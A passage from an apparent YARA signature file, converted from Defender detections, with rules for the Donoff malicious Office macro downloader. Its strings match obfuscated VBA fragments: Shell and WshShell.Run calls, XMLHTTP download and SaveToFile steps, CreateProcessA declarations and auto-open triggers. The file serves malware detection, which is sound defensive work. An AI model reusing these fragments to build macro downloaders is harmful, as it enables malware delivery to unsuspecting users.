        $x_1_1 = {3d 20 53 70 6c 69 74 28 22 04 00 5c 04 00 5c 04 00 5c 04 00 5c 04 00 5c 04 00 5c 04 00 5c 04 00 5c 04 00 [0-80] 22 2c 20 22 5c 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {46 6f 72 20 [0-15] 20 3d 20 4c 42 6f 75 6e 64 28 [0-15] 29 20 54 6f 20 55 42 6f 75 6e 64 28 01 29 [0-31] 20 3d 20 [0-31] 20 26 20 43 68 72 28 43 49 6e 74 28 01 28 [0-31] 29 29 20 2f 20 28 02 00 20 2d 20 02 00 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {43 61 6c 6c 42 79 4e 61 6d 65 28 0f 00 5f 5f 02 00 2c 20 00 5f 5f 02 00 28 02 00 29 2c 20 56 62 47 65 74 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_161
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {78 75 63 69 71 20 3d 20 55 73 65 72 46 6f 72 6d 31 2e 4c 61 62 65 6c 31 2e 43 61 70 74 69 6f 6e 0d 0a 53 68 65 6c 6c 20 78 75 63 69 71 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: High
        $x_1_2 = "ykubol(\"p$lxxt>33srqyr\") & ykubol(\"ewmiri{u2gsq3x\")" ascii //weight: 1
        $x_1_3 = "= \"2rr;oosCRRoiulgio;gwj]//]uEmaE[xRhui|69Es/lrr3FrVVqeqA[owK]cuqwu/maj]/lqGHM}}qwK]cuSgo;q(O!S(4\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_162
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {2e 4f 70 65 6e 28 73 28 22 54 45 47 22 2c 20 [0-2] 2c 20 [0-2] 29 2c 20 73 28}  //weight: 2, accuracy: Low
        $x_2_2 = {2e 53 65 74 52 65 71 75 65 73 74 48 65 61 64 65 72 28 73 28 22 67 74 65 41 6e 73 2d 65 55 72 22 2c 20 [0-2] 2c 20 [0-2] 29 2c 20 73 28}  //weight: 2, accuracy: Low
        $x_2_3 = {2e 53 65 74 52 65 71 75 65 73 74 48 65 61 64 65 72 28 73 28 22 65 67 41 2d 72 65 73 55 74 6e 22 2c 20 [0-2] 2c 20 [0-2] 29 2c 20 73 28}  //weight: 2, accuracy: Low
        $x_2_4 = {73 20 3d 20 4d 6f 64 75 6c 65 32 2e [0-6] 28 41 70 70 6c 69 63 61 74 69 6f 6e 2e 43 6c 65 61 6e 53 74 72 69 6e 67 28 [0-6] 29 2c}  //weight: 2, accuracy: Low
        $x_1_5 = "Err.Raise Number:=1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_2_*) and 1 of ($x_1_*))) or
            ((4 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_2147689064_163
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"rund\" & \"ll32.exe \"" ascii //weight: 1
        $x_1_2 = "\",qwerty\"," ascii //weight: 1
        $x_1_3 = "UNCFilePath = \"\\\\\" & host & \"\\\" & \"WMI_SHARE\" & \"\\\"" ascii //weight: 1
        $x_1_4 = "strDelFile = \"del \" & file & \" /F\"" ascii //weight: 1
        $x_1_5 = ", \"JIIIINX\")" ascii //weight: 1
        $x_1_6 = "\"\\vilaron}A.dll\"," ascii //weight: 1
        $x_1_7 = "(\"POLI\", \"____\")" ascii //weight: 1
        $x_1_8 = "HTTPJIIIINXAdodb.*Ptr" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_164
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Chr(152 - 52 + 0) & Chr(153 - 52 + 0) & Chr(108 - 52 + 0) & Chr(150 - 52 + 0) & Chr(152 - 52 + 0) & Chr(154 - 52 + 0) & Chr(109 - 52 + 0) & Chr(98 - 52 + 0) & Chr(153 - 52 + 0) & Chr(172 - 52 + 0) & Chr(153 - 52 + 0)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_165
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 70 6c 69 74 28 22 04 00 ?? 04 00 ?? 04 00 ?? 04 00 ?? 04 00 ?? 04 00 ?? 04 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? [0-95] 22 2c 20 22 01 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {5f 5f 31 2e 4f 70 65 6e 20 0f 00 28 03 00 20 (2d|2b) 20 28 03 00 20 (2d|2b) 20 03 00 20 (2d|2b) 20 03 00 29 29 2c 20 0f 00 2c 20 46 61 6c 73 65 [0-15] 5f 5f 31 2e 73 65 6e 64 [0-15] 5f 5f 34 20 3d 20 [0-15] 5f 5f 33 28 00 28 03 00 20 2f 20 03 00 29}  //weight: 1, accuracy: Low
        $x_1_3 = "= Replace(A1, A2, A3)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_166
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set FSOOO2 = CreateObject(KimberDon11(" ascii //weight: 1
        $x_1_2 = "EdEdE111 = fffffF & KimberDon11(" ascii //weight: 1
        $x_1_3 = "Set FSObject2 = CreateObject(KimberDon11(" ascii //weight: 1
        $x_1_4 = "If samama4fr(KimberDon11(vjf788eS, sdioph34), EdEdE111) Then" ascii //weight: 1
        $x_1_5 = "Set SASASA = CreateObject(KimberDon11(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_167
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {28 22 6e 72 ?? 65 ?? 72 ?? 65 ?? 66 ?? 65 ?? 52 22 29 2c ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? [0-47] 2f ?? 6e ?? 65 ?? 2f ?? 6d ?? 6f ?? 63 ?? 2e ?? 64 ?? 6e ?? 69 ?? 6d ?? 78 ?? 61 ?? 6d ?? 2e ?? 77 ?? 77 ?? 77 ?? 2f ?? 2f ?? 3a ?? 73 ?? 70 ?? 74 ?? 74 ?? 68 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {41 73 20 42 6f 6f 6c 65 61 6e ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? [0-239] 28 22 ?? 6c ?? 6c ?? 65 ?? 68 ?? 53 ?? 2e ?? 74 ?? 70 ?? 69 ?? 72 ?? 63 ?? 53 ?? 57 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_168
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "21"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = "Workbook_Open()" ascii //weight: 3
        $x_3_2 = "WshShell.Run" ascii //weight: 3
        $x_3_3 = ".WriteText Worksheets(" ascii //weight: 3
        $x_3_4 = ".SaveToFile(" ascii //weight: 3
        $x_3_5 = "WshShell.ExpandEnvironmentStrings(" ascii //weight: 3
        $x_3_6 = "Kill" ascii //weight: 3
        $x_3_7 = {46 6f 72 20 49 20 3d 20 31 20 54 6f 20 4c 65 6e 28 [0-8] 29 20 53 74 65 70 20 33 0d 0a 20 20 20 20 20 20 20 20 [0-8] 20 3d 20 4d 69 64 28 [0-8] 2c 20 49 2c 20 33 29 0d 0a 20 20 20 20 20 20 20 20 [0-32] 20 3d 20 [0-32] 20 26 20 43 68 72 28 [0-8] 29 0d 0a 20 20 20 20 4e 65 78 74 20 49}  //weight: 3, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_169
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "KITLQTRXGHRSWJYOVMPYDXNLLKNG.Add EYOTTSVNKODJJRSUQDKHYPQBPRYE(\"" ascii //weight: 1
        $x_1_2 = "BJLMIUJYQOISOJQVNMGZNYFLDLEG = Chr(Asc(BJLMIUJYQOISOJQVNMGZNYFLDLEG) - XFJKOBXMNEHQUPFDDCFXBEMZZIDE)" ascii //weight: 1
        $x_1_3 = {74 80 80 7c 46 3b 3b 83 83 83 3a 76 7b 7f 7f 85 7e 6d 85 3a 6f 7b 79 3b 6f 7b 70 71 3b 7f 80 85 78 71 3b 75 79 6d 73 71 7f 3b 50 71 6e 75 80 2c 4d 78 71 7e 80 3a 71 84 71 22 29}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_170
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".Open" ascii //weight: 1
        $x_1_2 = ".send" ascii //weight: 1
        $x_1_3 = ".Type =" ascii //weight: 1
        $x_1_4 = ".savetofile" ascii //weight: 1
        $x_1_5 = "Call Shell(" ascii //weight: 1
        $x_1_6 = {2e 77 72 69 74 65 20 [0-128] 2e 72 65 73 70 6f 6e 73 65 42 6f 64 79}  //weight: 1, accuracy: Low
        $x_1_7 = {53 74 61 74 69 63 20 [0-128] 43 6f 6e 73 74 20 [0-128] 20 3d 20 [0-8] 53 65 74 20 [0-128] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-48] 28 43 68 72 24 28 [0-3] 20 2d 20 [0-3] 29 20 26 20 43 68 72 24 28}  //weight: 1, accuracy: Low
        $x_1_8 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 43 68 72 24 28 [0-3] 20 2d 20 [0-3] 29 20 26 20 43 68 72 24 28}  //weight: 1, accuracy: Low
        $x_1_9 = {43 6f 6e 73 74 20 [0-128] 20 3d 20 [0-8] 45 6e 64}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_171
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "30"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {41 73 20 4c 6f 6e 67 [0-4] 46 6f 72 20 [0-8] 20 3d 20 34 38 20 54 6f 20 35 37 [0-4] 49 66 20}  //weight: 5, accuracy: Low
        $x_5_2 = {41 73 20 42 79 74 65 [0-4] 49 66 20 [0-8] 20 3c 20 30 20 54 68 65 6e 20 45 78 69 74 20 46 75 6e 63 74 69 6f 6e [0-4] 49 66 20 [0-8] 20 3e 20 32 35 35 20 54 68 65 6e [0-12] 20 3d 20 30 [0-4] 45 6c 73 65}  //weight: 5, accuracy: Low
        $x_5_3 = {20 2d 20 31 29 20 2a 20 32 [0-12] 20 3d 20 28 [0-8] 20 2a 20 32 29 20 2d 20 31}  //weight: 5, accuracy: Low
        $x_5_4 = {2e 52 75 6e 20 [0-8] 2c 20 28 [0-4] 20 2d 20 [0-4] 29 2c 20 28 [0-4] 20 2d 20 [0-4] 29}  //weight: 5, accuracy: Low
        $x_5_5 = "(1000) = " ascii //weight: 5
        $x_5_6 = {44 69 6d 20 [0-8] 28 30 20 54 6f 20 32 35 35 29 20 41 73 20 49 6e 74 65 67 65 72}  //weight: 5, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_172
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_2 = "= GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\CIMV2\")" ascii //weight: 1
        $x_1_3 = "PokerFace = CallByName(CofeeShop, \"response\" + \"Body\", VbGet)" ascii //weight: 1
        $x_1_4 = "CallByName CofeeShop, LocalBrowser.ToggleButton1.Caption, VbMethod" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_173
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"User-Agent\"" ascii //weight: 1
        $x_1_2 = "Set objWMIService = GetObject(\"winmgmts:\"" ascii //weight: 1
        $x_1_3 = ", Window1.OptionButton2.Tag," ascii //weight: 1
        $x_1_4 = ", 5) = \"SMTP:\" Then" ascii //weight: 1
        $x_1_5 = " = CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_6 = ", Window1.T2.Text, _" ascii //weight: 1
        $x_1_7 = " = Window1.Label1.Caption" ascii //weight: 1
        $x_1_8 = ".com/" ascii //weight: 1
        $x_1_9 = ".Environment(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_174
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "ROOHicroROOOHoft.XROOHLHTTPROOOOHAdodb.ROOOHtrROHaROOHROOOOHROOOHhROHll.Appl" ascii //weight: 3
        $x_2_2 = "variablrName2 = SUBBUS2(variablrName2, \"ROOH\", \"M\")" ascii //weight: 2
        $x_2_3 = "variablrName2 = SUBBUS2(variablrName2, \"ROOOH\", \"s\")" ascii //weight: 2
        $x_1_4 = "DeleteFile(\"/r0/setok\")" ascii //weight: 1
        $x_1_5 = "DeleteFile(\"/r0/setng\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 2 of ($x_1_*))) or
            ((1 of ($x_3_*) and 1 of ($x_2_*) and 1 of ($x_1_*))) or
            ((1 of ($x_3_*) and 2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_2147689064_175
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "XvQlYPQ Err, MONmQh" ascii //weight: 1
        $x_1_2 = "n = LYYUrhk(Err, ahwKcn, tnsmuV)" ascii //weight: 1
        $x_1_3 = "nzBOCic = nUeIbe(ahwKcn, YexYB(MONmQh))" ascii //weight: 1
        $x_1_4 = "Do While YexYB(wpPCg) < YexYB(MONmQh) - 12" ascii //weight: 1
        $x_1_5 = "wpPCg = wpPCg & jcEigN(MONmQh, nzBOCic + 1)" ascii //weight: 1
        $x_1_6 = "nzBOCic = nUeIbe((nzBOCic + tnsmuV), YexYB(MONmQh))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_176
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 72 69 76 61 74 65 20 44 65 63 6c 61 72 65 20 50 74 72 53 61 66 65 20 46 75 6e 63 74 69 6f 6e 20 [0-8] 20 4c 69 62 20 22 4b 65 72 6e 65 6c 33 32 22 20 41 6c 69 61 73 20 22 43 72 65 61 74 65 50 72 6f 63 65 73 73 41 22}  //weight: 1, accuracy: Low
        $x_1_2 = {50 72 69 76 61 74 65 20 44 65 63 6c 61 72 65 20 46 75 6e 63 74 69 6f 6e 20 [0-8] 20 4c 69 62 20 22 4b 65 72 6e 65 6c 33 32 22 20 41 6c 69 61 73 20 22 43 72 65 61 74 65 50 72 6f 63 65 73 73 41 22}  //weight: 1, accuracy: Low
        $x_1_3 = {50 75 62 6c 69 63 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 [0-16] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_4 = {45 6e 64 20 57 69 74 68 [0-16] 20 3d 20 [0-8] 28 30 26 2c 20 [0-24] 2c 20 46 61 6c 73 65 2c 20 [0-40] 29 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_177
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "16"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {3d 20 46 61 6c 73 65 20 54 68 65 6e [0-16] 43 61 6c 6c 20 [0-48] 43 61 6c 6c 20 [0-32] 45 78 69 74 20 53 75 62 [0-16] 45 6e 64 20 49 66 [0-16] 44 69 6d 20 [0-8] 20 41 73 20 53 74 72 69 6e 67}  //weight: 10, accuracy: Low
        $x_1_2 = "= .CountOfLines + 1" ascii //weight: 1
        $x_1_3 = ".InsertLines" ascii //weight: 1
        $x_1_4 = "Chr$(Asc(Mid$(" ascii //weight: 1
        $x_1_5 = "Application.Run ThisDocument." ascii //weight: 1
        $x_1_6 = "= CreateObject(ThisDocument." ascii //weight: 1
        $x_1_7 = ".Documents.Open FileName:=" ascii //weight: 1
        $x_1_8 = "= ThisDocument.FullName" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 6 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_2147689064_178
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "s(104, \"sdteaeueSqHreteR\", 125), 1, s(56, \"nAetgrUe-s\", 103), s(149, \".T ;Mp/0rN Sa5)iTWIt.Md iEi0oe6n b zn.d1l(it1o0ecl/;w.;ol6 s0 ma\", 263)" ascii //weight: 1
        $x_1_2 = "T NIRTOEOELSNCOSGHG\", 23), s(112, \"ERTORCIM DN\", 87), s(53, \"TESVUARWT\", 25), s(94, \"AEHNR OIARCMT\", 29), _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_179
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "rmblr = Array(" ascii //weight: 1
        $x_1_2 = {6c 50 72 65 63 69 73 69 6f 6e 44 61 74 61 2e 4f 70 65 6e 20 22 47 22 20 2b 20 41 54 45 4d 50 5f 53 54 52 20 2b 20 22 54 22 2c 20 5a 61 70 6f 72 6f 73 68 69 6c 6f 28 72 6d 62 6c 72 2c 20 [0-2] 29 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_3 = "AturTabelData = AddItemData(\"T\" + ATEMP_STR + \"MP\")" ascii //weight: 1
        $x_1_4 = "lPrecisionData.Send" ascii //weight: 1
        $x_1_5 = "TypeEnumData = AturTabelData + \"\\inp\" + zimbaba + \"tan.\" + zimbaba + \"x\" + zimbaba" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_180
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "c:\\temp\\LaptopLoaner.csv" ascii //weight: 1
        $x_1_2 = "c:\\temp\\LaptopLoaner.xls" ascii //weight: 1
        $x_1_3 = "Public Sub WellNowYouAreReady()" ascii //weight: 1
        $x_1_4 = "Sub autoopen()" ascii //weight: 1
        $x_1_5 = "Dim c As Rhhhh" ascii //weight: 1
        $x_1_6 = "Set c = New Rhhhh" ascii //weight: 1
        $x_1_7 = "CallByName c, Odish.T2.Text, VbMethod" ascii //weight: 1
        $x_1_8 = "If (SaveFileDialog1.ShowDialog() = Wind.ows.Forms.DialogResult.OK) Then" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_181
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Open unphilosphical For Binary Access Write Lock Read As #seamount" ascii //weight: 1
        $x_1_2 = "While (entanglement < chub)" ascii //weight: 1
        $x_1_3 = "beats = Mid(testvar3, entanglement, 2)" ascii //weight: 1
        $x_1_4 = "beats = \"&H\" + beats" ascii //weight: 1
        $x_1_5 = "Put #seamount, , CByte(beats)" ascii //weight: 1
        $x_1_6 = "entanglement = entanglement + 2" ascii //weight: 1
        $x_1_7 = "ballooning.Run unphilosphical" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_182
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "UqgtlG = UqgtlG & Chr(V42l31(V42l3))" ascii //weight: 1
        $x_2_2 = "V40s3(UqgtlG, MrtiA3Qrh08GDUn & Xdq3 & JGNLV1wPEmWK & EZjBC8Ffo0k0V)" ascii //weight: 2
        $x_1_3 = "UKyYP9kR3a(Q97pWv5sigi) = Q97pWv5sigi" ascii //weight: 1
        $x_1_4 = "XEoKsBrzHULC = XEoKsBrzHULC + XsJo8enm" ascii //weight: 1
        $x_2_5 = "X0neK = (K33vsmSClC And Not UmRmwQjgh) Or (Not K33vsmSClC And UmRmwQjgh)" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_2147689064_183
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
